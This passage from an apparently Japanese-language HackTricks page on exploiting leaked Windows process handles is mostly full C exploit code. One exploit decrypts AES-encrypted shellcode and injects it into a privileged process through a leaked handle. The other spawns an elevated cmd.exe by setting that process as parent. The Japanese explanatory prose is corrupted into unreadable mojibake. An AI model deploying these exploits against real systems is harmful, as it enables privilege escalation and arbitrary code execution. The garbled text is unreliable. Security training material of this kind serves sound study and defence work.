pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

bStatus = (BOOL) pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);
if (bStatus != FALSE) {
WaitForSingleObject(hThread, -1);
CloseHandle(hThread);
return 0;
}
else
return -1;
}

int main(int argc, char **argv) {

int pid = 0;
HANDLE hProc = NULL;

// AES encrypted shellcode spawning notepad.exe (ExitThread)
char key[] = { 0x49, 0xbc, 0xa5, 0x1d, 0xa7, 0x3d, 0xd6, 0x0, 0xee, 0x2, 0x29, 0x3e, 0x9b, 0xb2, 0x8a, 0x69 };
unsigned char payload[] = { 0x6b, 0x98, 0xe8, 0x38, 0xaf, 0x82, 0xdc, 0xd4, 0xda, 0x57, 0x15, 0x48, 0x2f, 0xf0, 0x4e, 0xd3, 0x1a, 0x70, 0x6d, 0xbf, 0x53, 0xa8, 0xcb, 0xbb, 0xbb, 0x38, 0xf6, 0x4e, 0xee, 0x84, 0x36, 0xe5, 0x25, 0x76, 0xce, 0xb0, 0xf6, 0x39, 0x22, 0x76, 0x36, 0x3c, 0xe1, 0x13, 0x18, 0x9d, 0xb1, 0x6e, 0x0, 0x55, 0x8a, 0x4f, 0xb8, 0x2d, 0xe7, 0x6f, 0x91, 0xa8, 0x79, 0x4e, 0x34, 0x88, 0x24, 0x61, 0xa4, 0xcf, 0x70, 0xdb, 0xef, 0x25, 0x96, 0x65, 0x76, 0x7, 0xe7, 0x53, 0x9, 0xbf, 0x2d, 0x92, 0x25, 0x4e, 0x30, 0xa, 0xe7, 0x69, 0xaf, 0xf7, 0x32, 0xa6, 0x98, 0xd3, 0xbe, 0x2b, 0x8, 0x90, 0x0, 0x9e, 0x3f, 0x58, 0xed, 0x21, 0x69, 0xcb, 0x38, 0x5d, 0x5e, 0x68, 0x5e, 0xb9, 0xd6, 0xc5, 0x92, 0xd1, 0xaf, 0xa2, 0x5d, 0x16, 0x23, 0x48, 0xbc, 0xdd, 0x2a, 0x9f, 0x3c, 0x22, 0xdb, 0x19, 0x24, 0xdf, 0x86, 0x4a, 0xa2, 0xa0, 0x8f, 0x1a, 0xe, 0xd6, 0xb7, 0xd2, 0x6c, 0x6d, 0x90, 0x55, 0x3e, 0x7d, 0x9b, 0x69, 0x87, 0xad, 0xd7, 0x5c, 0xf3, 0x1, 0x7c, 0x93, 0x1d, 0xaa, 0x40, 0xf, 0x15, 0x48, 0x5b, 0xad, 0x6, 0xb5, 0xe5, 0xb9, 0x92, 0xae, 0x9b, 0xdb, 0x9a, 0x9b, 0x4e, 0x44, 0x45, 0xdb, 0x9f, 0x28, 0x90, 0x9e, 0x63, 0x23, 0xf2, 0xca, 0xab, 0xa7, 0x68, 0xbc, 0x31, 0xb4, 0xf9, 0xbb, 0x73, 0xd4, 0x56, 0x94, 0x2c, 0x63, 0x47, 0x21, 0x84, 0xa2, 0xb6, 0x91, 0x23, 0x8f, 0xa0, 0x46, 0x76, 0xff, 0x3f, 0x75, 0xd, 0x51, 0xc5, 0x70, 0x26, 0x1, 0xcf, 0x23, 0xbf, 0x97, 0xb2, 0x8d, 0x66, 0x35, 0xc8, 0xe3, 0x2, 0xf6, 0xbd, 0x44, 0x83, 0xf2, 0x80, 0x4c, 0xd0, 0x7d, 0xa3, 0xbd, 0x33, 0x8e, 0xe8, 0x6, 0xbc, 0xdc, 0xff, 0xe0, 0x96, 0xd9, 0xdc, 0x87, 0x2a, 0x81, 0xf3, 0x53, 0x37, 0x16, 0x3a, 0xcc, 0x3c, 0x34, 0x4, 0x9c, 0xc6, 0xbb, 0x12, 0x72, 0xf3, 0xa3, 0x94, 0x5d, 0x19, 0x43, 0x56, 0xa8, 0xba, 0x2a, 0x1d, 0x12, 0xeb, 0xd2, 0x6e, 0x79, 0x65, 0x2a };
unsigned int payload_len = sizeof(payload);

printf("My PID: %d\n", GetCurrentProcessId());
getchar();

// find a leaked handle to a process
hProc = GetVulnProcHandle();

if ( hProc != NULL) {

// d#Decrypt payload
AESDecrypt((char *) payload, payload_len, key, sizeof(key));
printf("[+] Sending gift...");
// Inject and run the payload in the privileged context
Inject(hProc, payload, payload_len);
printf("done.\n");
}
getchar();

return 0;
}
```
### Exploit Example 2

{% hint style="info" %}
å®Ÿéš›ã®ã‚·ãƒŠãƒªã‚ªã§ã¯ã€è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãƒã‚¤ãƒŠãƒªï¼ˆã“ã®å ´åˆã¯ _C:\users\username\desktop\client.exe_ï¼‰ã‚’**åˆ¶å¾¡ã§ããªã„å¯èƒ½æ€§ãŒé«˜ã„**ã§ã™ã€‚ãŠãã‚‰ãã€**ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä¾µå®³ã—ã€ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã®è„†å¼±ãªãƒãƒ³ãƒ‰ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
{% endhint %}

ã“ã®ä¾‹ã§ã¯ã€**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¦å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ã‚’æ‚ªç”¨ã™ã‚‹ä»£ã‚ã‚Šã«**ã€**ç‰¹æ¨©ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã—ã¾ã™**ã€‚ã“ã‚Œã¯138è¡Œç›®ã‹ã‚‰148è¡Œç›®ã§è¡Œã‚ã‚Œã¾ã™ã€‚

**é–¢æ•° `UpdateProcThreadAttribute`** ãŒ **å±æ€§ `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` ã¨ã‚ªãƒ¼ãƒ—ãƒ³ç‰¹æ¨©ãƒ—ãƒ­ã‚»ã‚¹ã¸ã®ãƒãƒ³ãƒ‰ãƒ«** ã¨å…±ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯ã€**ä½œæˆã•ã‚ŒãŸãƒ—ãƒ­ã‚»ã‚¹ã‚¹ãƒ¬ãƒƒãƒ‰ãŒ \_cmd.exe**\_\*\* ã‚’å®Ÿè¡Œã™ã‚‹éš›ã«ã€ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ³ãƒ‰ãƒ«ãƒ—ãƒ­ã‚»ã‚¹ã¨åŒã˜ãƒˆãƒ¼ã‚¯ãƒ³ç‰¹æ¨©ã‚’æŒã¤ã“ã¨ã‚’æ„å‘³ã—ã¾ã™\*\*ã€‚
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "client.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")


HANDLE GetVulnProcHandle(void) {

ULONG handleInfoSize = 0x10000;
NTSTATUS status;
PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) malloc(handleInfoSize);
HANDLE hProc = NULL;
POBJECT_TYPE_INFORMATION objectTypeInfo;
PVOID objectNameInfo;
UNICODE_STRING objectName;
ULONG returnLength;
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
DWORD dwOwnPID = GetCurrentProcessId();

pNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
pNtDuplicateObject = GetProcAddress(hNtdll, "NtDuplicateObject");
pNtQueryObject = GetProcAddress(hNtdll, "NtQueryObject");
pRtlEqualUnicodeString = GetProcAddress(hNtdll, "RtlEqualUnicodeString");
pRtlInitUnicodeString = GetProcAddress(hNtdll, "RtlInitUnicodeString");

printf("[+] Grabbing handles...");

while ((status = pNtQuerySystemInformation( SystemHandleInformation, phHandleInfo, handleInfoSize,
NULL )) == STATUS_INFO_LENGTH_MISMATCH)
phHandleInfo = (PSYSTEM_HANDLE_INFORMATION) realloc(phHandleInfo, handleInfoSize *= 2);

if (status != STATUS_SUCCESS)
{
printf("[!] NtQuerySystemInformation failed!\n");
return 0;
}

printf("done.\n[+] Fetched %d handles.\n", phHandleInfo->NumberOfHandles);

// iterate handles until we find the privileged process handle
for (int i = 0; i < phHandleInfo->NumberOfHandles; ++i)
{
SYSTEM_HANDLE_TABLE_ENTRY_INFO handle = phHandleInfo->Handles[i];

// Check if this handle belongs to our own process
if (handle.UniqueProcessId != dwOwnPID)
continue;

objectTypeInfo = (POBJECT_TYPE_INFORMATION) malloc(0x1000);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectTypeInformation,
objectTypeInfo,
0x1000,
NULL ) != STATUS_SUCCESS)
continue;

// skip some objects to avoid getting stuck
// see: https://github.com/adamdriscoll/PoshInternals/issues/7
if (handle.GrantedAccess == 0x0012019f
&& handle.GrantedAccess != 0x00120189
&& handle.GrantedAccess != 0x120089
&& handle.GrantedAccess != 0x1A019F ) {
free(objectTypeInfo);
continue;
}

// get object name information
objectNameInfo = malloc(0x1000);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectNameInformation,
objectNameInfo,
0x1000,
&returnLength ) != STATUS_SUCCESS) {

// adjust the size of a returned object and query again
objectNameInfo = realloc(objectNameInfo, returnLength);
if (pNtQueryObject( (HANDLE) handle.HandleValue,
ObjectNameInformation,
objectNameInfo,
returnLength,
NULL ) != STATUS_SUCCESS) {
free(objectTypeInfo);
free(objectNameInfo);
continue;
}
}

// check if we've got a process object
objectName = *(PUNICODE_STRING) objectNameInfo;
UNICODE_STRING pProcess;

pRtlInitUnicodeString(&pProcess, L"Process");
if (pRtlEqualUnicodeString(&objectTypeInfo->TypeName, &pProcess, TRUE)) {
printf("[+] Found process handle (%x)\n", handle.HandleValue);
hProc = (HANDLE) handle.HandleValue;
free(objectTypeInfo);
free(objectNameInfo);
break;
}
else
continue;

free(objectTypeInfo);
free(objectNameInfo);
}

return hProc;
}


int main(int argc, char **argv) {

HANDLE hProc = NULL;
STARTUPINFOEXA si;
PROCESS_INFORMATION pi;
int pid = 0;
SIZE_T size;
BOOL ret;

Sleep(20000);
// find leaked process handle
hProc = GetVulnProcHandle();

if ( hProc != NULL) {

// Adjust proess attributes with PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
ZeroMemory(&si, sizeof(STARTUPINFOEXA));

InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc( GetProcessHeap(), 0, size );

InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);

si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

// Spawn elevated cmd process
ret = CreateProcessA( "C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE,
EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOA)(&si), &pi );

if (ret == FALSE) {
printf("[!] Error spawning new process: [%d]\n", GetLastError());
return -1;
}
}

Sleep(20000);
return 0;
}
```
## ãã®ä»–ã®ãƒ„ãƒ¼ãƒ«ã¨ä¾‹

* [**https://github.com/lab52io/LeakedHandlesFinder**](https://github.com/lab52io/LeakedHandlesFinder)

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€æ¼æ´©ã—ãŸãƒãƒ³ãƒ‰ãƒ«ã‚’ç›£è¦–ã—ã¦è„†å¼±ãªã‚‚ã®ã‚’è¦‹ã¤ã‘ã€è‡ªå‹•çš„ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã¾ãŸã€1ã¤ã®ãƒãƒ³ãƒ‰ãƒ«ã‚’æ¼æ´©ã•ã›ã‚‹ãƒ„ãƒ¼ãƒ«ã‚‚ã‚ã‚Šã¾ã™ã€‚

* [**https://github.com/abankalarm/ReHacks/tree/main/Leaky%20Handles**](https://github.com/abankalarm/ReHacks/tree/main/Leaky%20Handles)

ãƒãƒ³ãƒ‰ãƒ«ã‚’æ¼æ´©ã•ã›ã¦æ‚ªç”¨ã™ã‚‹ãŸã‚ã®åˆ¥ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)
* [https://github.com/lab52io/LeakedHandlesFinder](https://github.com/lab52io/LeakedHandlesFinder)
* [https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
